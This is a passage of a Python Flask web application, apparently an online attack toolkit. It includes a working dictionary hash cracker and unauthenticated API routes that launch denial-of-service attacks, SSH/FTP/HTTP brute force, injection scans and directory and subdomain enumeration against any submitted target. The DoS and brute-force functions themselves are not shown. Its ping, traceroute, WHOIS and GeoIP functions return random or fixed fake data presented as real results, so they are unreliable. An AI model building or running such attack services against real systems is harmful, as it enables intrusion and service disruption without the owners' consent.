    def hash_text(self, text, algorithm='all'):
        """Generate hashes for text"""
        result = {}
        
        if algorithm in ['md5', 'all']:
            result['md5'] = hashlib.md5(text.encode()).hexdigest()
        
        if algorithm in ['sha1', 'all']:
            result['sha1'] = hashlib.sha1(text.encode()).hexdigest()
        
        if algorithm in ['sha256', 'all']:
            result['sha256'] = hashlib.sha256(text.encode()).hexdigest()
        
        if algorithm in ['sha512', 'all']:
            result['sha512'] = hashlib.sha512(text.encode()).hexdigest()
        
        if algorithm in ['base64', 'all']:
            result['base64'] = base64.b64encode(text.encode()).decode()
        
        return result
    
    def crack_hash(self, hash_value, hash_type, wordlist):
        """Attempt to crack a hash using wordlist"""
        start_time = time.time()
        tried = 0
        
        for word in wordlist:
            tried += 1
            
            if hash_type == 'md5':
                test_hash = hashlib.md5(word.encode()).hexdigest()
            elif hash_type == 'sha1':
                test_hash = hashlib.sha1(word.encode()).hexdigest()
            elif hash_type == 'sha256':
                test_hash = hashlib.sha256(word.encode()).hexdigest()
            elif hash_type == 'sha512':
                test_hash = hashlib.sha512(word.encode()).hexdigest()
            else:
                return {'error': 'Unsupported hash type'}
            
            if test_hash == hash_value:
                return {
                    'found': True,
                    'plaintext': word,
                    'tried': tried,
                    'time': round(time.time() - start_time, 2)
                }
        
        return {
            'found': False,
            'tried': tried,
            'time': round(time.time() - start_time, 2)
        }
    
    def verify_hash(self, text, hash_value, hash_type):
        """Verify if hash matches text"""
        if hash_type == 'md5':
            calculated_hash = hashlib.md5(text.encode()).hexdigest()
        elif hash_type == 'sha1':
            calculated_hash = hashlib.sha1(text.encode()).hexdigest()
        elif hash_type == 'sha256':
            calculated_hash = hashlib.sha256(text.encode()).hexdigest()
        elif hash_type == 'sha512':
            calculated_hash = hashlib.sha512(text.encode()).hexdigest()
        else:
            return {'error': 'Unsupported hash type'}
        
        return {
            'valid': calculated_hash == hash_value,
            'expected_hash': calculated_hash,
            'provided_hash': hash_value
        }
    
    def network_ping(self, target, count=4):
        """Ping a target (simulated)"""
        try:
            # Simulate ping results
            times = [random.randint(10, 100) for _ in range(count)]
            
            return {
                'target': target,
                'packets_sent': count,
                'packets_received': count,
                'packet_loss': 0,
                'times': times,
                'min_time': min(times),
                'avg_time': sum(times) / len(times),
                'max_time': max(times)
            }
        except Exception as e:
            return {'error': str(e)}
    
    def network_traceroute(self, target):
        """Traceroute to target (simulated)"""
        try:
            # Simulate traceroute results
            hops = []
            for i in range(1, random.randint(5, 15)):
                hops.append({
                    'hop': i,
                    'ip': f'192.168.{random.randint(1, 255)}.{random.randint(1, 255)}',
                    'hostname': f'router{i}.isp.net',
                    'times': [random.randint(10, 100) for _ in range(3)]
                })
            
            return {
                'target': target,
                'hops': hops
            }
        except Exception as e:
            return {'error': str(e)}
    
    def network_whois(self, target):
        """WHOIS lookup (simulated)"""
        try:
            # Simulate WHOIS results
            return {
                'domain': target,
                'registrar': 'Example Registrar, Inc.',
                'creation_date': '2020-01-01',
                'expiration_date': '2025-01-01',
                'name_servers': ['ns1.example.com', 'ns2.example.com'],
                'status': 'active'
            }
        except Exception as e:
            return {'error': str(e)}
    
    def network_geoip(self, target):
        """GeoIP lookup (simulated)"""
        try:
            # Simulate GeoIP results
            return {
                'ip': target,
                'country': 'United States',
                'city': 'San Francisco',
                'region': 'California',
                'isp': 'Example ISP',
                'latitude': 37.7749,
                'longitude': -122.4194
            }
        except Exception as e:
            return {'error': str(e)}
    
    def analyze_headers(self, url):
        """Analyze HTTP headers"""
        try:
            response = requests.get(url, timeout=5, verify=False, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            result = {
                'url': url,
                'status': response.status_code,
                'server': response.headers.get('Server', 'Not specified'),
                'headers': dict(response.headers)
            }
            
            # Security analysis
            security_analysis = []
            headers_to_check = [
                'X-Frame-Options',
                'X-Content-Type-Options', 
                'X-XSS-Protection',
                'Content-Security-Policy',
                'Strict-Transport-Security'
            ]
            
            for header in headers_to_check:
                if header in response.headers:
                    security_analysis.append({
                        'header': header,
                        'status': 'OK',
                        'description': 'Header present'
                    })
                else:
                    security_analysis.append({
                        'header': header,
                        'status': 'MISSING',
                        'description': 'Header not present - security risk'
                    })
            
            result['security_analysis'] = security_analysis
            
            return result
            
        except Exception as e:
            return {'error': str(e)}

# Initialize scanner
scanner = StableSecurityScanner()

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    deployment_platform = os.environ.get('RENDER', 'Railway' if os.environ.get('RAILWAY') else 'Local')
    deployment_env = os.environ.get('ENVIRONMENT', 'Production' if os.environ.get('PRODUCTION') else 'Development')
    return render_template_string(HTML_TEMPLATE, deployment_platform=deployment_platform, deployment_env=deployment_env)

# Reconnaissance routes
@app.route('/api/info', methods=['POST'])
def api_info():
    data = request.json
    result = scanner.info_gathering(
        data.get('target', ''),
        data.get('scan_type', 'basic'),
        data.get('options', {})
    )
    return jsonify(result)

@app.route('/api/portscan', methods=['POST'])
def api_portscan():
    data = request.json
    result = scanner.port_scan(
        data.get('target', ''),
        data.get('scan_type', 'quick'),
        data.get('port_range', None),
        data.get('timeout', 2)
    )
    return jsonify(result)

@app.route('/api/dns', methods=['POST'])
def api_dns():
    data = request.json
    result = scanner.dns_enumeration(
        data.get('domain', ''),
        data.get('record_types', ['A', 'AAAA', 'MX', 'NS', 'TXT'])
    )
    return jsonify(result)

@app.route('/api/subdomain', methods=['POST'])
def api_subdomain():
    data = request.json
    result = scanner.subdomain_scan(
        data.get('domain', ''),
        data.get('wordlist', 'medium'),
        data.get('threads', 50)
    )
    return jsonify(result)

@app.route('/api/dirscan', methods=['POST'])
def api_dirscan():
    data = request.json
    result = scanner.directory_scan(
        data.get('url', ''),
        data.get('wordlist', 'medium'),
        data.get('extensions', []),
        data.get('threads', 20)
    )
    return jsonify(result)

# Vulnerability scanning routes
@app.route('/api/vulnscan', methods=['POST'])
def api_vulnscan():
    data = request.json
    result = scanner.vulnerability_scan(
        data.get('url', ''),
        data.get('depth', 'standard'),
        data.get('checks', {})
    )
    return jsonify(result)

@app.route('/api/sqli', methods=['POST'])
def api_sqli():
    data = request.json
    # For now, redirect to vulnerability scan with SQLI focus
    result = scanner.vulnerability_scan(
        data.get('url', ''),
        'standard',
        {'sqli': True, 'xss': False, 'lfi': False, 'cmd': False, 'headers': False, 'ssl': False, 'xxe': False, 'ssrf': False}
    )
    return jsonify(result)

@app.route('/api/xss', methods=['POST'])
def api_xss():
    data = request.json
    # For now, redirect to vulnerability scan with XSS focus
    result = scanner.vulnerability_scan(
        data.get('url', ''),
        'standard',
        {'sqli': False, 'xss': True, 'lfi': False, 'cmd': False, 'headers': False, 'ssl': False, 'xxe': False, 'ssrf': False}
    )
    return jsonify(result)

@app.route('/api/lfi', methods=['POST'])
def api_lfi():
    data = request.json
    # For now, redirect to vulnerability scan with LFI focus
    result = scanner.vulnerability_scan(
        data.get('url', ''),
        'standard',
        {'sqli': False, 'xss': False, 'lfi': True, 'cmd': False, 'headers': False, 'ssl': False, 'xxe': False, 'ssrf': False}
    )
    return jsonify(result)

@app.route('/api/cmd', methods=['POST'])
def api_cmd():
    data = request.json
    # For now, redirect to vulnerability scan with Command Injection focus
    result = scanner.vulnerability_scan(
        data.get('url', ''),
        'standard',
        {'sqli': False, 'xss': False, 'lfi': False, 'cmd': True, 'headers': False, 'ssl': False, 'xxe': False, 'ssrf': False}
    )
    return jsonify(result)

# Attack tools routes
@app.route('/api/bruteforce', methods=['POST'])
def api_bruteforce():
    data = request.json
    result = scanner.brute_force(
        data.get('type', 'http'),
        data.get('config', {}),
        data.get('usernames', []),
        data.get('passwords', []),
        data.get('threads', 10),
        data.get('delay', 100)
    )
    return jsonify(result)

@app.route('/api/dos', methods=['POST'])
def api_dos():
    data = request.json
    attack_id = scanner.dos_attack(
        data.get('target', ''),
        data.get('attack_type', 'http'),
        data.get('threads', 100),
        data.get('duration', 30)
    )
    return jsonify({'message': 'DoS attack started', 'attack_id': attack_id})

@app.route('/api/dos/status/<attack_id>', methods=['GET'])
def api_dos_status(attack_id):
    if attack_id in scanner.active_attacks:
        return jsonify(scanner.active_attacks[attack_id])
    return jsonify({'status': 'not_found'})

@app.route('/api/ssh', methods=['POST'])
def api_ssh():
    data = request.json
    result = scanner.ssh_brute_force(
        data.get('target', ''),
        data.get('usernames', []),
        data.get('passwords', [])
    )
    return jsonify(result)

@app.route('/api/ftp', methods=['POST'])
def api_ftp():
    data = request.json
    result = scanner.ftp_brute_force(
        data.get('target', ''),
        data.get('usernames', []),
        data.get('passwords', [])
    )
    return jsonify(result)

@app.route('/api/crawl', methods=['POST'])
def api_crawl():
    data = request.json
    result = scanner.web_crawler(
        data.get('url', ''),
        data.get('depth', 2),
        data.get('threads', 10),
        data.get('options', {})
    )
    return jsonify(result)

# Utility routes
@app.route('/api/hash/generate', methods=['POST'])
def api_hash_generate():
    data = request.json
    result = scanner.hash_text(
        data.get('text', ''),
        data.get('algorithm', 'all')
    )
    return jsonify(result)

@app.route('/api/hash/crack', methods=['POST'])
def api_hash_crack():
    data = request.json
    result = scanner.crack_hash(
        data.get('hash', ''),
        data.get('hash_type', 'md5'),
        data.get('wordlist', [])
    )
    return jsonify(result)

@app.route('/api/hash/verify', methods=['POST'])
def api_hash_verify():
    data = request.json
    result = scanner.verify_hash(
        data.get('text', ''),
        data.get('hash', ''),
        data.get('hash_type', 'md5')
    )
    return jsonify(result)

@app.route('/api/network/ping', methods=['POST'])
def api_network_ping():
    data = request.json
    result = scanner.network_ping(
        data.get('target', ''),
        data.get('count', 4)
    )
    return jsonify(result)

@app.route('/api/network/traceroute', methods=['POST'])
def api_network_traceroute():
    data = request.json
    result = scanner.network_traceroute(data.get('target', ''))
    return jsonify(result)

@app.route('/api/network/whois', methods=['POST'])
def api_network_whois():
    data = request.json
    result = scanner.network_whois(data.get('target', ''))
    return jsonify(result)

@app.route('/api/network/geoip', methods=['POST'])
def api_network_geoip():
    data = request.json
    result = scanner.network_geoip(data.get('target', ''))
    return jsonify(result)

@app.route('/api/headers', methods=['POST'])
def api_headers():
    data = request.json
    result = scanner.analyze_headers(data.get('url', ''))
    return jsonify(result)

# System routes
@app.route('/api/stats', methods=['GET'])
def api_stats():
    return jsonify({
        'active_scans': len(scanner.active_scans),
        'active_attacks': len(scanner.active_attacks),
        'found_vulns': scanner.found_vulns
    })

@app.route('/api/stop/<scan_type>', methods=['POST'])
def api_stop(scan_type):
    # Stop scans of this type
    to_stop = []
    for scan_id, scan_info in scanner.active_scans.items():
        if scan_info['type'] == scan_type:
            to_stop.append(scan_id)
    
    for scan_id in to_stop:
        del scanner.active_scans[scan_id]
    
    # Stop attacks
    if scan_type == 'dos':
        for attack_id in list(scanner.active_attacks.keys()):
            scanner.active_attacks[attack_id]['status'] = 'stopped'
    
    return jsonify({'stopped': len(to_stop)})

@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'ok',
        'version': '4.0',
        'tools': ['reconnaissance', 'vulnerability_scanning', 'attack_tools', 'utilities'],
        'timestamp': time.time()
    })

# Error handling
@app.errorhandler(404)
def not_found(e):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify({'error': 'Internal server error'}), 500

# ==================== MAIN ====================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
